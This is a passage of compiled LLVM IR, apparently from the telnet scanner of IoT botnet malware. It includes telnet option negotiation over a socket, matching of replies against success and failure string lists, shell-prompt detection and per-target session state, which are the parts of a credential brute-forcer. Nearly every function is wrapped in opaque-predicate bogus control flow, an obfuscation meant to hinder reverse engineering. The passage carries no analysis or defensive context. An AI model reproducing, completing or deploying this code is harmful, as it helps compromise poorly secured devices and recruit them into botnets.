  %17 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %18 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %17, i32 0, i32 2
  store i8 %16, i8* %18, align 8
  %19 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %20 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %19, i32 0, i32 9
  %21 = load i8*, i8** %20, align 8
  call void @llvm.memset.p0i8.i64(i8* %21, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

declare i32 @close(i32) #2

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = load i32, i32* @x.59
  %3 = load i32, i32* @y.60
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_success(i8* %11)
  %13 = icmp ne i32 %12, 0
  %14 = load i32, i32* @x.59
  %15 = load i32, i32* @y.60
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %42, label %22

; <label>:22:                                     ; preds = %originalBBpart2
  %23 = load i32, i32* @x.59
  %24 = load i32, i32* @y.60
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %22
  %31 = load i8*, i8** %10, align 8
  %32 = call i32 @contains_fail(i8* %31)
  %33 = icmp ne i32 %32, 0
  %34 = load i32, i32* @x.59
  %35 = load i32, i32* @y.60
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %originalBBpart2
  %43 = phi i1 [ true, %originalBBpart2 ], [ %33, %originalBBpart24 ]
  %44 = load i32, i32* @x.59
  %45 = load i32, i32* @y.60
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %52 = zext i1 %43 to i32
  %53 = load i32, i32* @x.59
  %54 = load i32, i32* @y.60
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret i32 %52

originalBBalteredBB:                              ; preds = %originalBB, %1
  %61 = alloca i8*, align 8
  store i8* %0, i8** %61, align 8
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @contains_success(i8* %62)
  %64 = icmp ne i32 %63, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %22
  %65 = load i8*, i8** %10, align 8
  %66 = call i32 @contains_fail(i8* %65)
  %67 = icmp ne i32 %66, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %68 = zext i1 %43 to i32
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %49, %17
  %19 = load i32, i32* %7, align 4
  %20 = load i32, i32* %6, align 4
  %21 = icmp slt i32 %19, %20
  br i1 %21, label %22, label %52

; <label>:22:                                     ; preds = %18
  %23 = load i8*, i8** %4, align 8
  %24 = load i8**, i8*** %5, align 8
  %25 = load i32, i32* %7, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8*, i8** %24, i64 %26
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %23, i8* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %48

; <label>:31:                                     ; preds = %22
  %32 = load i32, i32* @x.61
  %33 = load i32, i32* @y.62
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %31
  store i32 1, i32* %3, align 4
  %40 = load i32, i32* @x.61
  %41 = load i32, i32* @y.62
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %53

; <label>:48:                                     ; preds = %22
  br label %49

; <label>:49:                                     ; preds = %48
  %50 = load i32, i32* %7, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %7, align 4
  br label %18

; <label>:52:                                     ; preds = %18
  store i32 0, i32* %3, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %originalBBpart2
  %54 = load i32, i32* @x.61
  %55 = load i32, i32* @y.62
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i32, i32* %3, align 4
  %63 = load i32, i32* @x.61
  %64 = load i32, i32* @y.62
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %62

originalBBalteredBB:                              ; preds = %originalBB, %31
  store i32 1, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %71 = load i32, i32* %3, align 4
  br label %originalBB1
}

declare i32 @strcasestr(...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = load i32, i32* @x.63
  %5 = load i32, i32* @y.64
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  store i32 %0, i32* %13, align 4
  store i8* %1, i8** %14, align 8
  store i32 %2, i32* %15, align 4
  %17 = load i8*, i8** %14, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = load i32, i32* @x.63
  %22 = load i32, i32* @y.64
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  switch i32 %20, label %125 [
    i32 255, label %29
    i32 251, label %30
    i32 252, label %30
    i32 253, label %30
    i32 254, label %30
  ]

; <label>:29:                                     ; preds = %originalBBpart2
  store i32 0, i32* %12, align 4
  br label %159

; <label>:30:                                     ; preds = %originalBBpart2, %originalBBpart2, %originalBBpart2, %originalBBpart2
  store i8 -1, i8* %16, align 1
  %31 = load i32, i32* %13, align 4
  %32 = call i64 @send(i32 %31, i8* %16, i64 1, i32 16384)
  %33 = load i8*, i8** %14, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 252, %36
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %30
  store i8 -2, i8* %16, align 1
  br label %118

; <label>:39:                                     ; preds = %30
  %40 = load i8*, i8** %14, align 8
  %41 = getelementptr inbounds i8, i8* %40, i64 1
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 254, %43
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %39
  store i8 -4, i8* %16, align 1
  br label %101

; <label>:46:                                     ; preds = %39
  %47 = load i32, i32* @x.63
  %48 = load i32, i32* @y.64
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8*, i8** %14, align 8
  %56 = getelementptr inbounds i8, i8* %55, i64 1
  %57 = load i8, i8* %56, align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 3, %58
  %60 = load i32, i32* @x.63
  %61 = load i32, i32* @y.64
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %59, label %68, label %76

; <label>:68:                                     ; preds = %originalBBpart24
  %69 = load i8*, i8** %14, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 1
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 253
  %74 = select i1 %73, i32 251, i32 253
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %16, align 1
  br label %100

; <label>:76:                                     ; preds = %originalBBpart24
  %77 = load i32, i32* @x.63
  %78 = load i32, i32* @y.64
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = load i8*, i8** %14, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 1
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp eq i32 %88, 253
  %90 = select i1 %89, i32 252, i32 254
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %16, align 1
  %92 = load i32, i32* @x.63
  %93 = load i32, i32* @y.64
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %100

; <label>:100:                                    ; preds = %originalBBpart28, %68
  br label %101

; <label>:101:                                    ; preds = %100, %45
  %102 = load i32, i32* @x.63
  %103 = load i32, i32* @y.64
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* @x.63
  %111 = load i32, i32* @y.64
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %118

; <label>:118:                                    ; preds = %originalBBpart212, %38
  %119 = load i32, i32* %13, align 4
  %120 = call i64 @send(i32 %119, i8* %16, i64 1, i32 16384)
  %121 = load i32, i32* %13, align 4
  %122 = load i8*, i8** %14, align 8
  %123 = getelementptr inbounds i8, i8* %122, i64 2
  %124 = call i64 @send(i32 %121, i8* %123, i64 1, i32 16384)
  br label %142

; <label>:125:                                    ; preds = %originalBBpart2
  %126 = load i32, i32* @x.63
  %127 = load i32, i32* @y.64
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %125
  %134 = load i32, i32* @x.63
  %135 = load i32, i32* @y.64
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %142

; <label>:142:                                    ; preds = %originalBBpart216, %118
  %143 = load i32, i32* @x.63
  %144 = load i32, i32* @y.64
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  store i32 0, i32* %12, align 4
  %151 = load i32, i32* @x.63
  %152 = load i32, i32* @y.64
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %159

; <label>:159:                                    ; preds = %originalBBpart220, %29
  %160 = load i32, i32* %12, align 4
  ret i32 %160

originalBBalteredBB:                              ; preds = %originalBB, %3
  %161 = alloca i32, align 4
  %162 = alloca i32, align 4
  %163 = alloca i8*, align 8
  %164 = alloca i32, align 4
  %165 = alloca i8, align 1
  store i32 %0, i32* %162, align 4
  store i8* %1, i8** %163, align 8
  store i32 %2, i32* %164, align 4
  %166 = load i8*, i8** %163, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 1
  %168 = load i8, i8* %167, align 1
  %169 = zext i8 %168 to i32
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %170 = load i8*, i8** %14, align 8
  %171 = getelementptr inbounds i8, i8* %170, i64 1
  %172 = load i8, i8* %171, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 3, %173
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %76
  %175 = load i8*, i8** %14, align 8
  %176 = getelementptr inbounds i8, i8* %175, i64 1
  %177 = load i8, i8* %176, align 1
  %178 = zext i8 %177 to i32
  %179 = icmp eq i32 %178, 253
  %180 = select i1 %179, i32 252, i32 254
  %181 = trunc i32 %180 to i8
  store i8 %181, i8* %16, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %125
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %142
  store i32 0, i32* %12, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.65
  %3 = load i32, i32* @y.66
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.243, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #9
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.65
  %20 = load i32, i32* @y.66
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %originalBBpart241, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = sext i32 %28 to i64
  %30 = load i8*, i8** %12, align 8
  %31 = call i64 @strlen(i8* %30) #9
  %32 = icmp ult i64 %29, %31
  br i1 %32, label %33, label %196

; <label>:33:                                     ; preds = %27
  br label %34

; <label>:34:                                     ; preds = %originalBBpart225, %33
  %35 = load i32, i32* %13, align 4
  %36 = load i32, i32* %15, align 4
  %37 = icmp sgt i32 %35, %36
  br i1 %37, label %38, label %120

; <label>:38:                                     ; preds = %34
  %39 = load i8*, i8** %11, align 8
  %40 = load i32, i32* %13, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i32, i32* %15, align 4
  %44 = sext i32 %43 to i64
  %45 = sub i64 0, %44
  %46 = getelementptr inbounds i8, i8* %42, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = sext i8 %47 to i32
  %49 = icmp eq i32 %48, 0
  br i1 %49, label %118, label %50

; <label>:50:                                     ; preds = %38
  %51 = load i8*, i8** %11, align 8
  %52 = load i32, i32* %13, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %15, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 32
  br i1 %61, label %118, label %62

; <label>:62:                                     ; preds = %50
  %63 = load i32, i32* @x.65
  %64 = load i32, i32* @y.66
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %62
  %71 = load i8*, i8** %11, align 8
  %72 = load i32, i32* %13, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i32, i32* %15, align 4
  %76 = sext i32 %75 to i64
  %77 = sub i64 0, %76
  %78 = getelementptr inbounds i8, i8* %74, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = icmp eq i32 %80, 13
  %82 = load i32, i32* @x.65
  %83 = load i32, i32* @y.66
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart27, label %originalBB1alteredBB

originalBBpart27:                                 ; preds = %originalBB1
  br i1 %81, label %118, label %90

; <label>:90:                                     ; preds = %originalBBpart27
  %91 = load i32, i32* @x.65
  %92 = load i32, i32* @y.66
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %90
  %99 = load i8*, i8** %11, align 8
  %100 = load i32, i32* %13, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  %103 = load i32, i32* %15, align 4
  %104 = sext i32 %103 to i64
  %105 = sub i64 0, %104
  %106 = getelementptr inbounds i8, i8* %102, i64 %105
  %107 = load i8, i8* %106, align 1
  %108 = sext i8 %107 to i32
  %109 = icmp eq i32 %108, 10
  %110 = load i32, i32* @x.65
  %111 = load i32, i32* @y.66
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart220, label %originalBB9alteredBB

originalBBpart220:                                ; preds = %originalBB9
  br label %118

; <label>:118:                                    ; preds = %originalBBpart220, %originalBBpart27, %50, %38
  %119 = phi i1 [ true, %originalBBpart27 ], [ true, %50 ], [ true, %38 ], [ %109, %originalBBpart220 ]
  br label %120

; <label>:120:                                    ; preds = %118, %34
  %121 = phi i1 [ false, %34 ], [ %119, %118 ]
  br i1 %121, label %122, label %141

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* @x.65
  %124 = load i32, i32* @y.66
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %122
  %131 = load i32, i32* %15, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %15, align 4
  %133 = load i32, i32* @x.65
  %134 = load i32, i32* @y.66
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart225, label %originalBB22alteredBB

originalBBpart225:                                ; preds = %originalBB22
  br label %34

; <label>:141:                                    ; preds = %120
  %142 = load i8*, i8** %11, align 8
  %143 = load i32, i32* %13, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  %146 = load i32, i32* %15, align 4
  %147 = sext i32 %146 to i64
  %148 = sub i64 0, %147
  %149 = getelementptr inbounds i8, i8* %145, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = load i8*, i8** %12, align 8
  %153 = load i32, i32* %14, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = icmp eq i32 %151, %157
  br i1 %158, label %159, label %176

; <label>:159:                                    ; preds = %141
  %160 = load i32, i32* @x.65
  %161 = load i32, i32* @y.66
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %159
  store i32 1, i32* %10, align 4
  %168 = load i32, i32* @x.65
  %169 = load i32, i32* @y.66
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBBpart230, label %originalBB27alteredBB

originalBBpart230:                                ; preds = %originalBB27
  br label %197

; <label>:176:                                    ; preds = %141
  br label %177

; <label>:177:                                    ; preds = %176
  %178 = load i32, i32* @x.65
  %179 = load i32, i32* @y.66
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %177
  %186 = load i32, i32* %14, align 4
  %187 = add nsw i32 %186, 1
  store i32 %187, i32* %14, align 4
  %188 = load i32, i32* @x.65
  %189 = load i32, i32* @y.66
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBBpart241, label %originalBB32alteredBB

originalBBpart241:                                ; preds = %originalBB32
  br label %27

; <label>:196:                                    ; preds = %27
  store i32 0, i32* %10, align 4
  br label %197

; <label>:197:                                    ; preds = %196, %originalBBpart230
  %198 = load i32, i32* %10, align 4
  ret i32 %198

originalBBalteredBB:                              ; preds = %originalBB, %1
  %199 = alloca i32, align 4
  %200 = alloca i8*, align 8
  %201 = alloca i8*, align 8
  %202 = alloca i32, align 4
  %203 = alloca i32, align 4
  %204 = alloca i32, align 4
  store i8* %0, i8** %200, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.243, i32 0, i32 0), i8** %201, align 8
  %205 = load i8*, i8** %200, align 8
  %206 = call i64 @strlen(i8* %205) #9
  %207 = trunc i64 %206 to i32
  store i32 %207, i32* %202, align 4
  store i32 0, i32* %204, align 4
  store i32 0, i32* %203, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  %208 = load i8*, i8** %11, align 8
  %209 = load i32, i32* %13, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds i8, i8* %208, i64 %210
  %212 = load i32, i32* %15, align 4
  %213 = sext i32 %212 to i64
  %_ = sub i64 0, %213
  %gen = mul i64 %_, %213
  %_2 = shl i64 0, %213
  %_3 = shl i64 0, %213
  %_4 = sub i64 0, 0
  %gen5 = add i64 %_4, %213
  %214 = sub i64 0, %213
  %215 = getelementptr inbounds i8, i8* %211, i64 %214
  %216 = load i8, i8* %215, align 1
  %217 = sext i8 %216 to i32
  %218 = icmp eq i32 %217, 13
  br label %originalBB1

originalBB9alteredBB:                             ; preds = %originalBB9, %90
  %219 = load i8*, i8** %11, align 8
  %220 = load i32, i32* %13, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i8, i8* %219, i64 %221
  %223 = load i32, i32* %15, align 4
  %224 = sext i32 %223 to i64
  %_10 = sub i64 0, %224
  %gen11 = mul i64 %_10, %224
  %_12 = sub i64 0, %224
  %gen13 = mul i64 %_12, %224
